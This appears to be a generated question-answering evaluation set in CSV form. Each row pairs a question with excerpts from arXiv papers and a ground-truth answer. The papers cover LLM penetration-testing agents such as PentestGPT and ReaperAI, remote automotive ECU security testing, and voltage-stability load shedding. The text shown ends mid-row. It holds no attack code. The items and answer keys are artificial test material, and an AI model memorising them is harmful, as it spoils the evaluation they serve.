question,contexts,ground_truth,evolution_type,metadata,episode_done
"How do LLMs' attention limits affect their role in dynamic security tasks, despite tools like PentestGPT?","[' al. [2024]\nCreativity is a critical asset in cybersecurity, particularly for human penetra-\ntion testers. These professionals thrive on their ability to think outside the box\nand devise innovative approaches to security testing, often breaking away from\nestablished patterns to uncover vulnerabilities that automated systems might\noverlook.\n2.5.8\nDiligence\nDiligence in humans refers to their ability to consistently perform tasks ac-\ncurately over time and to their fullest extent of knowledge and skills. Although\nLLMs can process and analyze large datasets with remarkable speed and ac-\ncuracy, they lack the continuous attention to detail necessary for diligence. Jin\net al. [2024] They do not have the capability to self-assess their performance crit-\nically or improve independently without further training or updates, which can\nlimit their application in environments requiring ongoing, meticulous attention\nto complex or changing data.\nIn the field of offensive security, the challenge of penetration testing is in-\nherently complex, often demanding significant human investment in terms of\ntime and expertise. While we can expect an LLM to deploy its full capabilities, it\nfalls short in actively pursuing all possible avenues and may need to revisit in-\nformation and tasks to improve outcomes, similar to what is required of human\noperators. LLMs have to be instructed and don’t have natural knowledge of how\nthe world works and especially how computers work.\n2.5.9\nSituational Awareness\nLLMs typically lack situational awareness, which is critical in dynamic and\ncontext-dependent settings. They do not possess an understanding of the world\nin the same way humans do, nor can they interpret context beyond the scope of\ntheir training data. This limitation is particularly evident in scenarios requiring\nreal-time decision-making or adaptation to new and unforeseen circumstances,\nwhich can impede their effectiveness in roles that require a high level of contex-\ntual adaptability. There have been systems that try to overcome this, like dynamic\nretrieval augmented generation where ”Our framework is specifically designed\nto make decisions on when and what to retrieve based on the LLM’s real-time\ninformation needs during the text generation process.” Su et al. [2024]\nThis limitation is a very steep hurdle for using LLMs to conduct offensive\nsecurity due to the real time nature of the problem set that makes up penetration\ntesting. Analyzing what is happening in real time is even a matter of exploitation\n10\nor not with some time based attacks. Developing a way to properly integrate\nreal time data into an LLMs prompts would be invaluable to not only offensive\nsecurity but solving complex tasks all together.\n2.6\nAgents\nGPT agents OpenAI [2023], or Generative Pre-trained Transformer agents,\nare also a very significant advancement in artificial intelligence and especially in\nLLMs. GPT models can be subsequently fine-tuned to perform specific tasks and\nare labeled as ”agents”. These agents are built on the existing models that are\ninitially pre-trained on a broad spectrum of internet-based text. This approach\ngives them the skills to grasp subtle context, generate text that’s relevant and\ncoherent, and handle language-based and domain specific tasks with impressive\nexpertise.\nThe adaptability of GPT agents makes them applicable across a variety of\nfields, including customer service, content creation, summarization, program-\nming, task automation, insight generation, and enhancing user interaction. Their\ncapacity to continually learn from user engagements and adapt to novel infor-\nmation renders them invaluable for businesses aiming to harness AI to boost ef-\nficiency and engagementfr0gger [2023].\nFurther developments in GPT technology have introduced new methodolo-\ngies where individual agents, each trained with a specific prompt, sequentially\nprocess and hand off their outcomes to subsequent agents. This model facilitates\na more customized approach to problem-solving or response generation. During\nthe period of this research, innovations like ”Crew AI” Crew AI [2023] and ”Au-\ntoGenStudio” Autogen Studio [2023] emerged as leading platforms for creating\nsuch agent-based systems. This concept is particularly promising for develop-\ning autonomous systems like penetration testers, where the complexity of tasks\nnecessitates decomposition into manageable, discrete segments that can be effec-\ntively handled by LLMs.\n11\nCHAPTER 3\nCORE TECHNOLOGIES AND METHODOLOGIES\nThe core technologies and methodologies employed in this project form the\nbackbone of the research, emphasizing the integration of sophisticated AI tools\nwith advanced cybersecurity practices. At the heart of the technology stack is gpt-\n4-turbo-preview from OpenAI OpenAI [20', ' analytical capabil-\nities to stay ahead of cybercriminals. Zennaro and Erd˝\nodi [2023]\n2.4\nReview of Current AI in Offensive Security\nRecent research in the field of cybersecurity has highlighted the significant\nrole that artificial intelligence plays in enhancing offensive security measures.\nAdvanced AI models, particularly those based on deep learning, are now re-\nlied on, in automating the detection of vulnerabilities, which was once manual\nand very labor-intensive. For example, the AutoPentest-DRL framework employs\n4\ndeep reinforcement learning to automate and optimize penetration testing, al-\nlowing dynamic and efficient vulnerability exploitation within network systems\nOrganization et al. [2020]. Moreover, AI’s job of simulating complex cyberat-\ntack strategies through reinforcement learning models has expanded the scope of\noffensive security. Such models not only mimic attacker behaviors, but also inno-\nvate attack strategies, providing cybersecurity professionals with a tool set to an-\nticipate potential breaches Yang and Liu [2022]. The integration of AI in penetra-\ntion testing is also highlighted by its effectiveness in crafting sophisticated phish-\ning emails that can evade standard detection systems, showcasing the ability of\nAI to adopt an attacker’s mindset, which is truly alarmingERMProtect [2020].\nThe adoption of large language models through natural language processing rep-\nresents a particularly compelling advancement in artificial intelligence and ma-\nchine learning due to the sheer level of intelligence, capable of understanding,\nreasoning, and offering suggestions and summarizations. This is made possible\nby their training on extensive internet datasets, making them highly valuable for\ncomplex tasks such as offensive security. In this paper, we will explore examples\nof these tools, as our discussion is primarily centered on the application of LLMs.\n2.4.1\nPentestGPT\nPentestGPT Deng et al. [2023] is a sophisticated penetration testing tool that\nleverages the power of OpenAI’s GPT-4 to automate and streamline the penetra-\ntion testing process. Designed to function interactively, PentestGPT assists testers\nby guiding them through both the general progression of their penetration test\nand the execution of specific tasks. This tool is particularly adept at handling\nmedium complexity Hack the Box machines and various Capture The Flag (CTF)\nchallenges, enhancing the efficiency and precision of penetration tests.\nThe architecture of PentestGPT includes several modules that handle dif-\nferent aspects of the penetration testing workflow. It features a test generation\nmodule that generates the necessary commands for the testers to execute, a test\nreasoning module that aids in decision-making during the test, and a parsing\nmodule that interprets the outputs from the penetration tools and web interfaces.\nThese components work together to provide a comprehensive and automated\npenetration testing solution.\nPentestGPT has been shown to significantly outperform earlier models like\nGPT-3.5 in penetration testing tasks, achieving higher rates of task completion\nand demonstrating substantial improvements in operational efficiency. The de-\nvelopment of PentestGPT reflects a notable advance in the use of LLMs for prac-\ntical cybersecurity applications, offering a powerful tool that mimics the collabo-\nrative dynamics between experienced and novice testers in real-world settings.\n5\n2.4.2\nHackingbuddyGPT\nHackingbuddyGPT Happe and Cito [2023] is a cutting-edge tool designed\nto explore the potential of large language models in penetration testing, partic-\nularly focusing on Linux privilege escalation scenarios. Developed by the IPA\nLab, hackingbuddyGPT integrates with OpenAI’s GPT models to automate com-\nmand generation for security testing. The tool operates by connecting via SSH to\nLinux targets (or SMB/PS Exec for Windows targets) and utilizes OpenAI’s REST\nAPI-compatible models like GPT-3.5 Turbo and GPT-4 to suggest commands that\ncould potentially expose vulnerabilities or escalate privileges. Happe et al. [2023]\nThe system logs all run data, either into a file or in-memory, and features\nautomatic root detection and a beautifully designed console output for better user\ninteraction. One of the key functionalities of hackingbuddyGPT is its ability to\nlimit rounds of interaction, which dictates how often the LLM will be queried for\nnew commands, allowing for controlled testing scenarios. Happe and Cito [2023]\n2.5\nLLM Limitations\nLarge Language Models, such as GPT from OpenAI OpenAI [2023], possess\nsome serious capabilities in human natural language understanding and genera-\ntion, but, they also encounter several limitations that can affect their functionality\nand']","LLMs typically lack situational awareness, which is critical in dynamic and context-dependent settings. They do not possess an understanding of the world in the same way humans do, nor can they interpret context beyond the scope of their training data. This limitation is particularly evident in scenarios requiring real-time decision-making or adaptation to new and unforeseen circumstances, which can impede their effectiveness in roles that require a high level of contextual adaptability. This limitation is a very steep hurdle for using LLMs to conduct offensive security due to the real time nature of the problem set that makes up penetration testing.",multi_context,"[{'Published': '2024-05-09', 'Title': 'Artificial Intelligence as the New Hacker: Developing Agents for Offensive Security', 'Authors': 'Leroy Jacob Valencia', 'Summary': ""In the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper\nexplores the integration of Artificial Intelligence (AI) into offensive\ncybersecurity, particularly through the development of an autonomous AI agent,\nReaperAI, designed to simulate and execute cyberattacks. Leveraging the\ncapabilities of Large Language Models (LLMs) such as GPT-4, ReaperAI\ndemonstrates the potential to identify, exploit, and analyze security\nvulnerabilities autonomously.\n  This research outlines the core methodologies that can be utilized to\nincrease consistency and performance, including task-driven penetration testing\nframeworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced by\nRetrieval Augmented Generation (RAG) for contextual understanding and memory\nretention. ReaperAI was tested on platforms including, Hack The Box, where it\nsuccessfully exploited known vulnerabilities, demonstrating its potential\npower.\n  However, the deployment of AI in offensive security presents significant\nethical and operational challenges. The agent's development process revealed\ncomplexities in command execution, error handling, and maintaining ethical\nconstraints, highlighting areas for future enhancement.\n  This study contributes to the discussion on AI's role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with\ncybersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a\nunique approach to AI implementation in cybersecurity, emphasizing innovation."", 'entry_id': 'http://arxiv.org/abs/2406.07561v1', 'published_first_time': '2024-05-09', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2406.07561v1', 'http://arxiv.org/pdf/2406.07561v1']}, {'Published': '2024-05-09', 'Title': 'Artificial Intelligence as the New Hacker: Developing Agents for Offensive Security', 'Authors': 'Leroy Jacob Valencia', 'Summary': ""In the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper\nexplores the integration of Artificial Intelligence (AI) into offensive\ncybersecurity, particularly through the development of an autonomous AI agent,\nReaperAI, designed to simulate and execute cyberattacks. Leveraging the\ncapabilities of Large Language Models (LLMs) such as GPT-4, ReaperAI\ndemonstrates the potential to identify, exploit, and analyze security\nvulnerabilities autonomously.\n  This research outlines the core methodologies that can be utilized to\nincrease consistency and performance, including task-driven penetration testing\nframeworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced by\nRetrieval Augmented Generation (RAG) for contextual understanding and memory\nretention. ReaperAI was tested on platforms including, Hack The Box, where it\nsuccessfully exploited known vulnerabilities, demonstrating its potential\npower.\n  However, the deployment of AI in offensive security presents significant\nethical and operational challenges. The agent's development process revealed\ncomplexities in command execution, error handling, and maintaining ethical\nconstraints, highlighting areas for future enhancement.\n  This study contributes to the discussion on AI's role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with\ncybersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a\nunique approach to AI implementation in cybersecurity, emphasizing innovation."", 'entry_id': 'http://arxiv.org/abs/2406.07561v1', 'published_first_time': '2024-05-09', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2406.07561v1', 'http://arxiv.org/pdf/2406.07561v1']}]",True
What is the performance of PENTESTGPT in the picoMini CTF competition?,"['\ndesign, which retains the full testing context, compensates for\nthe absence of the Parsing Module, ensuring minimal perfor-\nmance reduction. (2) PENTESTGPT-NO-REASONING has the\nlowest success, achieving just 53.6% of the sub-tasks of the\nfull variant. This is even lower than the basic GPT-4 setup.\nThe Generation Module’s added sub-tasks distort the LLM\ncontext. The mismatched prompts and extended generation\noutput cloud the original context, causing the test’s failure.\n(3) PENTESTGPT-NO-GENERATION slightly surpasses the\nbasic GPT-4. Without the Generation Module, the process\nTable 5: PENTESTGPT performance over the active Hack-\nTheBox Challenges.\nMachine\nDifficulty\nCompletions\nCompleted Users\nCost (USD)\nSau\nEasy\n5/5 (✓)\n4798\n15.2\nPilgramage\nEasy\n3/5 (✓)\n5474\n12.6\nTopology\nEasy\n0/5 (✗)\n4500\n8.3\nPC\nEasy\n4/5 (✓)\n6061\n16.1\nMonitorsTwo\nEasy\n3/5 (✓)\n8684\n9.2\nAuthority\nMedium\n0/5 (✗)\n1209\n11.5\nSandworm\nMedium\n0/5 (✗)\n2106\n10.2\nJupiter\nMedium\n0/5 (✗)\n1494\n6.6\nAgile\nMedium\n2/5 (✓)\n4395\n22.5\nOnlyForYou\nMedium\n0/5 (✗)\n2296\n19.3\nTotal\n-\n17/50 (6)\n-\n131.5\nTable 6: PENTESTGPT performance over picoMini CTF.\nChallenge\nCategory\nScore\nCompletions\nlogin\nweb\n100\n5/5 (✓)\nadvance-potion-making\nforensics\n100\n3/5 (✓)\nspelling-quiz\ncrypto\n100\n4/5 (✓)\ncaas\nweb\n150\n2/5 (✓)\nXtrOrdinary\ncrypto\n150\n5/5 (✓)\ntripplesecure\ncrypto\n150\n3/5 (✓)\nclutteroverflow\nbinary\n150\n1/5 (✓)\nnot crypto\nreverse\n150\n0/5 (✗)\nscrambled-bytes\nforensics\n200\n0/5 (✗)\nbreadth\nreverse\n200\n0/5 (✗)\nnotepad\nweb\n250\n1/5 (✓)\ncollege-rowing-team\ncrypto\n250\n2/5 (✓)\nfermat-strings\nbinary\n250\n0/5 (✗)\ncorrupt-key-1\ncrypto\n350\n0/5 (✗)\nSaaS\nbinary\n350\n0/5 (✗)\nriscy business\nreverse\n350\n0/5 (✗)\nhomework\nbinary\n400\n0/5 (✗)\nlockdown-horses\nbinary\n450\n0/5 (✗)\ncorrupt-key-2\ncrypto\n500\n0/5 (✗)\nvr-school\nbinary\n500\n0/5 (✗)\nMATRIX\nreverse\n500\n0/5 (✗)\nmirrors standard LLM usage. The module’s main role is guid-\ning precise testing operations. Without it, testers might require\nadditional information to use essential tools or scripts.\n6.5\nPracticality Study (RQ6)\nWe demonstrate PENTESTGPT’s applicability in real-world\npenetration testing scenarios, extending beyond standardized\nbenchmarks. For this analysis, we deploy PENTESTGPT in\ntwo distinct challenge formats: (1) HackTheBox (HTB) ac-\ntive machine challenges, which present a series of real-world\npenetration testing scenarios accessible to a global audience.\nWe selected 10 machines from the active list, comprising five\ntargets of easy difficulty and five of intermediate difficulty.\n(2) picoMini [21], a jeopardy-style Capture The Flag (CTF)\ncompetition organized by Carnegie Mellon University and\nredpwn [60]. The competition featured 21 unique CTF chal-\n14\nlenges and drew participation']","PENTESTGPT's performance in the picoMini CTF competition is as follows: It completed 5/5 tasks in the 'login' web category, 3/5 tasks in the 'advance-potion-making' forensics category, 4/5 tasks in the 'spelling-quiz' crypto category, 2/5 tasks in the 'caas' web category, 5/5 tasks in the 'XtrOrdinary' crypto category, 3/5 tasks in the 'tripplesecure' crypto category, 1/5 tasks in the 'clutteroverflow' binary category, 0/5 tasks in the 'not crypto' reverse category, 0/5 tasks in the 'scrambled-bytes' forensics category, 0/5 tasks in the 'breadth' reverse category, 1/5 tasks in the 'notepad' web category, 2/5 tasks in the 'college-rowing-team' crypto category, 0/5 tasks in the 'fermat-strings' binary category, 0/5 tasks in the 'corrupt-key-1' crypto category, 0/5 tasks in the 'SaaS' binary category, 0/5 tasks in the 'riscy business' reverse category, 0/5 tasks in the 'homework' binary category, 0/5 tasks in the 'lockdown-horses' binary category, 0/5 tasks in the 'corrupt-key-2' crypto category, 0/5 tasks in the 'vr-school' binary category, and 0/5 tasks in the 'MATRIX' reverse category.",simple,"[{'Published': '2024-06-02', 'Title': 'PentestGPT: An LLM-empowered Automatic Penetration Testing Tool', 'Authors': 'Gelei Deng, Yi Liu, Víctor Mayoral-Vilches, Peng Liu, Yuekang Li, Yuan Xu, Tianwei Zhang, Yang Liu, Martin Pinzger, Stefan Rass', 'Summary': 'Penetration testing, a crucial industrial practice for ensuring system\nsecurity, has traditionally resisted automation due to the extensive expertise\nrequired by human professionals. Large Language Models (LLMs) have shown\nsignificant advancements in various domains, and their emergent abilities\nsuggest their potential to revolutionize industries. In this research, we\nevaluate the performance of LLMs on real-world penetration testing tasks using\na robust benchmark created from test machines with platforms. Our findings\nreveal that while LLMs demonstrate proficiency in specific sub-tasks within the\npenetration testing process, such as using testing tools, interpreting outputs,\nand proposing subsequent actions, they also encounter difficulties maintaining\nan integrated understanding of the overall testing scenario.\n  In response to these insights, we introduce PentestGPT, an LLM-empowered\nautomatic penetration testing tool that leverages the abundant domain knowledge\ninherent in LLMs. PentestGPT is meticulously designed with three\nself-interacting modules, each addressing individual sub-tasks of penetration\ntesting, to mitigate the challenges related to context loss. Our evaluation\nshows that PentestGPT not only outperforms LLMs with a task-completion increase\nof 228.6\\% compared to the \\gptthree model among the benchmark targets but also\nproves effective in tackling real-world penetration testing challenges. Having\nbeen open-sourced on GitHub, PentestGPT has garnered over 4,700 stars and\nfostered active community engagement, attesting to its value and impact in both\nthe academic and industrial spheres.', 'entry_id': 'http://arxiv.org/abs/2308.06782v2', 'published_first_time': '2023-08-13', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.SE', 'categories': ['cs.SE', 'cs.CR'], 'links': ['http://arxiv.org/abs/2308.06782v2', 'http://arxiv.org/pdf/2308.06782v2']}]",True
How do auto-grade MCUs and remote access speed up ECU network tests?,"['aims to discover as much information about the target as\npossible. The duration and effort in this phase is largely\ndetermined by the amount of information available to the\ntester. VSEC Test allows users to build a pool of their\nown test scripts or use built-in discovery scans specifically\ntargeting automotive networks, including protocols such\nas UDS and XCP. These tests can be queued up and ran\nin the background or over the weekend, saving time and\nallowing a team to focus on more technically challenging\ntasks or other projects. The web interface allows testers to\naccess and check on test status at any time from anywhere\nto determine the next step of action.\nPartner Pentesting. A major difficulty in access-\ning the talent pool of world-class vehicle penetration\ntesters is physical location. The VSEC Test platform\nenables any remote engineer with credentials to connect\nto the bench and handle any physical interactions with\nthe component and remotely script and execute tests from\nVSEC Test. We call this Partner Pentesting.\nTo evaluate the Partner Pentesting concept, we set up a\nscenario as depicted in Figure 2, where a remote wireless\npenetration testing specialist is working with a local test\nengineer to control a software-defined radio connected to\nthe cloud and capture communication between the key fob\nFigure 2. The remote test engineer can access either a fully remote testing platform with access to multiple test beds or work collaboratively with an\nin-lab (i.e., local to the lab) test engineer for tests that require hands-on support. This Partner Pentesting method enables the technical specialist to\nfocus on their testing strategies while leaving the hardware setup and physical controls to the lab technician/local test engineer.\nand the car in addition to any vehicle network messages.\nThe specialist then proceeds to study and decode the traf-\nfic, create scripts to attack the communication, and work\ntogether with the local test engineer to validate findings.\nIn this case, without physical access to the vehicle and a\nlocal partner to perform tasks, it would have been very\ndifficult to perform a meaningful penetration test against\nthe vehicle’s wireless entry system.\nSide-channel analysis. On the other hand, we have\nother benches in the lab can be tested with little to no\nuser interactions. For these targets, fully remote network-\nlevel penetration test with a test bench setup can achieve\nresults on-par with on-site engagements. However, we\nfound that more hands-on penetration testing procedures\nsuch as hardware analysis and side channel attacks are\nstill very difficult to perform without having an onsite spe-\ncialist. As a result, while acceptable for many scenarios,\nfully remote penetration testing remains very limited for\ncertain configurations due to manual activation required\nfor physical interfaces and required hardware and tooling\ninteraction for certain procedures. However, we are able\nto make progress with a Partner Pentesting setup that\nprovides assistance from onsite personnel and achieves\ncomparable outcomes as a fully onsite engagement.\n4.3. Research testing\nWe now discuss how our testing platform can enable a\nresearcher to rapidly establish and experiment with numer-\nous ECU networks to support their security research. A\ntesting platform where the ECUs present on the bus can be\neasily configured to support the development of a research\nproject is ideal for fine-tuning an attack or defense.\nEnhancing test bed functionality. For research\nuse cases, it is critical to have a programmable ECU\non the network to launch attacks or implement defenses.\nTypically, simulation-based environments remove real-\nworld characteristics, such as bus voltage, bit-level CAN\nbus arbitration, bus errors, etc. Likewise, advanced at-\ntacks beyond simple CAN bus injection often require\nmicrocontroller-level timing precision that cannot be\nachieved by the PC-USB interface. Thus, our platform\nincludes an automotive-grade MCU to mimic having pro-\ngramming access to an ECU. For other testing purposes,\na bench with MCUs from several vendors could enable\na user to test with different vendor libraries and MCU\nfeatures very quickly.\nExploring real research use cases. We identify a\nset of research projects that use a similar test setup and\ndemonstrate how our testing platform could have made\nthat research easier and more efficient. To demonstrate\nthe usefulness of this new remote and configurable plat-\nform, we implement and test three different open-source\nresearch implementations using a single bench of ECUs.\nWe remotely run the CANvas network mapper [10] to\ncorrectly identify unique ECUs on two CAN buses with\ndifferent speeds and across several configurations network\ntopologies. We also remotely demonstrate the CANnon\nbus disruption attack [11] using the automotive-grade mi-\ncrocontroller']","Auto-grade MCUs and remote access speed up ECU network tests by providing a programmable ECU on the network to launch attacks or implement defenses. This setup allows for rapid configuration and experimentation with numerous ECU networks, supporting the development of research projects. The automotive-grade MCU mimics having programming access to an ECU, enabling advanced attacks and precise microcontroller-level timing that cannot be achieved by a PC-USB interface.",reasoning,"[{'Published': '2024-04-02', 'Title': 'Towards a New Configurable and Practical Remote Automotive Security Testing Platform', 'Authors': 'Sekar Kulandaivel, Wenjuan Lu, Brandon Barry, Jorge Guajardo', 'Summary': 'In the automotive security sector, the absence of a testing platform that is\nconfigurable, practical, and user-friendly presents considerable challenges.\nThese difficulties are compounded by the intricate design of vehicle systems,\nthe rapid evolution of attack vectors, and the absence of standardized testing\nmethodologies. We propose a next-generation testing platform that addresses\nseveral challenges in vehicle cybersecurity testing and research domains. In\nthis paper, we detail how the Vehicle Security Engineering Cloud (VSEC) Test\nplatform enables easier access to test beds for efficient vehicle cybersecurity\ntesting and advanced (e.g., penetration, fuzz) testing and how we extend such\ntest beds to benefit automotive security research. We highlight methodology on\nhow to use this platform for a variety of users and use cases with real\nimplemented examples.', 'entry_id': 'http://arxiv.org/abs/2404.02291v1', 'published_first_time': '2024-04-02', 'comment': '7 pages, 2 figures', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.SY', 'eess.SY'], 'links': ['http://arxiv.org/abs/2404.02291v1', 'http://arxiv.org/pdf/2404.02291v1']}]",True
How does the critical load shedding threshold affect DASM and induction motor stability during fault recovery?,"['Critically \nStable\nAfter \nfailed \nUVLS\n×\n×\nSecure \nPoint\nInsecure \nPoint\nPositive \nMargin\nNegative \nMargin\n×\n*\nOperating \nPoint \nMapping\nOP0\nOP1\nOP2\n0\n0\n0\nFig. 2.\nPower system security margin incorporating both system state\ninformation and emergency control actions.\ns\ns0\ns2\nA\nPre-Fault\nDuring Fault\nA\uf0a2 \nC\uf0a2 \nB\uf0a2 \nD\uf0a2 \nC\nB\nD\ns1\ns3\nTm\nTe\nFig. 3. Changes in slip during the fault process.\ndistance from the point to ∂ADSR into the solution of the\nminimum distance from the point to a point on ∂ADSR. The\ndetailed computational procedures of DSM are thoroughly\noutlined in [26].\nTo enhance reader comprehension, we illustrate the concept\nusing a system equipped with induction motors as an example.\nSpecifically, we apply a similar mathematical formulation to\naddress short-term DSM when considering emergency control\nactions. In this system, voltage instability is closely linked to\nthe risk of motor stalling [27]. Throughout the fault recovery\nstage, the system’s slip rate and the absorbed reactive power\nare approximately adhered to the subsequent equations:\n2Hi\nds\ndt = Tmi −\nrR1v2\ni /s\nrs + (rR1/s)2 + (xs + xR1)2\nqi = v2\ni\nxm\n+ v2\ni\nxs + xR1\nrs + (rR1/s)2 + (xs + xR1)2\n(8)\nwhere rR1, rs, xR1, xs and xm are the induction motor\nparameters. Tmi is the torque. vi is the voltage amplitude of\nbus i, and qi is the reactive power absorbed by the motor.\nFrom the given formula, the relationship between motor slip\nand electromagnetic torque Te can be determined. During the\nentire fault process, the slip of the motor changes as shown\n5\nPower system \nInput \noperating \nstates \nFeature \nextraction\nFeature \nextraction\nC2(s, a)\nC1(s)\nC(s, a)\nRegularization\nEvaluated \naction\nEmergency \ndecision system\nFig. 4. Proposed state-action-joint security margin estimation network.\nin Fig. 3, where the slip ratio at the moment of the fault\noccurrence is s0, and the slip ratio of the extreme point is\ns2. When a fault occurs, the slip ratio will remain s0, and\nthe status point moves from A to A′. Because Te is smaller\nthan Tmi at the moment, s will increase. The slip ratio will\nremain unchanged when the fault is cleared, while the voltage\nwill try to increase and revert to its value before the fault,\naltering the status point. During the recovery process, if the\nload shedding is not applied or the load shedding amount is\ninsufficient, the slip ratio s will continue to escalate, surpassing\ns2; this leads to motor stalling and a failed UVLS scenario,\ndepicted as ‘failed UVLS’ in Fig. 2 (b) (corresponding to\npoint OP1 in Fig. 2 (a)). Conversely, if the load shedding\nis sufficient, the motor slip will consistently remain below s2\nthroughout the recovery, ensuring stability. This scenario is\nillustrated as ‘feasible UVLS’ in Fig. 2 (b) (corresponding to\npoint OP2 in Fig. 2 (a)). In the analysis outlined above, a\ncritical load shedding threshold exists, which is the minimum\namount of load that must be shed to ensure the system’s\nstability. This pivotal value is demonstrated as the ‘Feasible\nAction Boundary’ in Fig. 2 (c). The dynamic action-jointed\nsecurity margin (DASM) is defined as follows:\nDASM = dis(P, ∂ADSR) + dis(PLS, ∂ALS,P )\n(9)\nwhere ∂ALS,P is the ‘Feasible Action Boundary’ of emer-\ngency control action at operating point P, and PLS is the\nload shedding amount. The latter term shows the impact of\nload shedding on the security margin, and the subscript P\ndenotes that the calculation of the threshold above depends on\nthe specific operating point.', ' Within the injected power space\nand the UVLS space, we can further simplify the solution to\nthe formula as follows:\nDASM = min dis([P, PLS], [PC, PLS,P ]),\ns.t. PC ∈∂ADSR and PLS,P ∈∂ALS,P\n(10)\nSimilarly, we can address the problem via gradient opti-\nmization. Consequently, this approach leads to an integrated\nrepresentation of the power system’s security margin, which\nencompasses both the system’s state information and the\nemergency control measures.\n2) State-action-joint Structure for Margin Estimation:\nDespite introducing the security margin representation incor-\nporating action and operating points, resolving the DASM with\nnonlinear attributes remains challenging. The employment of\nNNs, with their robust nonlinear feature extraction capabilities,\npresents a viable solution. However, the precise estimation\nof the DASM necessitates effectively extracting the power\nsystem’s operating point characteristics and their integration\nwith emergency control actions. Drawing inspiration from\nthe dueling DQN [28], our study reevaluates the challenges\nassociated with short-term voltage security margin estimation\nin power systems. We focus on the discrepant impacts of\nthe power system’s static operating point and the emergency\ncontrol actions on post-fault stability. Specifically, we propose\na joint state-action security margin estimation network, as\nshown in Fig. 4. The proposed innovative dueling framework\ndelineates the state-wise security value function C1(s) and the\nadvantage function C2(s, a) from the predicted overarching\nsecurity margin C. The state-wise security value function\nC1(s) is exclusively tasked with forecasting the security\nmargin at the present operating point, while the advantage\nfunction C2(s, a) is dedicated to evaluating the influence\nof each emergency control action on the security margin\noutcomes at that operating point:\nC(s, a) = C1(s) −C2(s, a)\n(11)\nGiven the absence of constraints on the state-wise security\nvalue function and the advantage function, (11) is unidentifi-\nable in the sense that C1 and C2 cannot be recovered via given\nC. Hence, the learned features may diverge from anticipated\noutcomes. To address this, (11) is reformulated as follows:\nC(s, a) =\n(C1(s) −(C2(s, a) −min\nai∈A C2(s, ai)), discrete\nC1(s) −(C2(s, a) −C2(s, azero)), continuous\n(12)\nwhere the terms ‘discrete’ and ‘continuous’ refer to whether\nthe action space is discrete or continuous. A is the action\nspace and minai∈A C2(s, ai) denotes the minimal advantage\nvalue in C2(s, ·) with discrete action space. Similarly, azero\nepitomizes the advantage function under unregulated situations\nwith continuous action space. The procedures above serve not\nonly to regularize the feature extraction but also to fortify the\ntraining process.\nEmploying the decomposition mentioned above enables a\nmore effective capture of the distinctive features of risky\noperating points within the power system, surpassing the\nconventional network architecture and refining estimation ac-\ncuracy. Moreover, the proposed architecture’s capacity to\nindependently investigate the attributes of operating states\nand actions ensures that the computation of the state-wise\nmargin function and the advantage function remains robust\nagainst interference upon changes in the operating scenarios.\nThis attribute endows the proposed method with superior\ngeneralization capabilities across complex scenarios.\n3) Critical Operating Samples Searching and Training via\nUncertainty: Given the vast array of potential operating points\nin intricate power systems, one crux of enhancing training effi-\nciency lies in selecting samples pivotal for training. In training\nthe security margin estimator for obtaining the DSR boundary,\nnot every sample contributes equally. Samples proximate to\nthe classification boundary are instrumental in developing\nprecise security boundaries and margins. Consequently, this\nresearch proposes a search scheme for pivotal operational\nsamples grounded in AL methodology. The quintessence\n6\nof AL involves commencing with a limited set of initial\ncalibration samples to derive a preliminary evaluation model.\nSubsequently, employing a defined sample search strategy,\na cohort of the most informative samples is selected for\ncalibration. Specifically, a sample’s proximity to the DSR\nboundary directly correlates to its utility in obtaining an\n']","The critical load shedding threshold is the minimum amount of load that must be shed to ensure the system's stability. If the load shedding is sufficient, the motor slip will consistently remain below s2 throughout the recovery, ensuring stability. Conversely, if the load shedding amount is insufficient, the slip ratio s will continue to escalate, surpassing s2, leading to motor stalling and a failed UVLS scenario. This threshold directly impacts the dynamic action-jointed security margin (DASM) by influencing the system's stability during fault recovery.",multi_context,"[{'Published': '2024-05-26', 'Title': 'Make Safe Decisions in Power System: Safe Reinforcement Learning Based Pre-decision Making for Voltage Stability Emergency Control', 'Authors': 'Congbo Bi, Lipeng Zhu, Di Liu, Chao Lu', 'Summary': ""The high penetration of renewable energy and power electronic equipment bring\nsignificant challenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies in today's power\nsystems. Traditional model-based emergency control methods have difficulty in\nadapt well to various complicated operating conditions in practice. Fr emerging\nartificial intelligence-based approaches, i.e., reinforcement learning-enabled\nsolutions, they are yet to provide solid safety assurances under strict\nconstraints in practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-decision making\nframework against short-term voltage collapse. Our proposed framework employs\nneural networks for pre-decision formulation, security margin estimation, and\ncorrective action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a security\nprojecting correction algorithm that offers theoretical security assurances to\namend risky actions. The applicability of the algorithm is further enhanced\nthrough the incorporation of active learning, which expedites the training\nprocess and improves security estimation accuracy. Extensive numerical tests on\nthe New England 39-bus system and the realistic Guangdong Provincal Power Grid\ndemonstrate the effectiveness of the proposed framework."", 'entry_id': 'http://arxiv.org/abs/2405.16485v1', 'published_first_time': '2024-05-26', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'eess.SY', 'categories': ['eess.SY', 'cs.SY'], 'links': ['http://arxiv.org/abs/2405.16485v1', 'http://arxiv.org/pdf/2405.16485v1']}, {'Published': '2024-05-26', 'Title': 'Make Safe Decisions in Power System: Safe Reinforcement Learning Based Pre-decision Making for Voltage Stability Emergency Control', 'Authors': 'Congbo Bi, Lipeng Zhu, Di 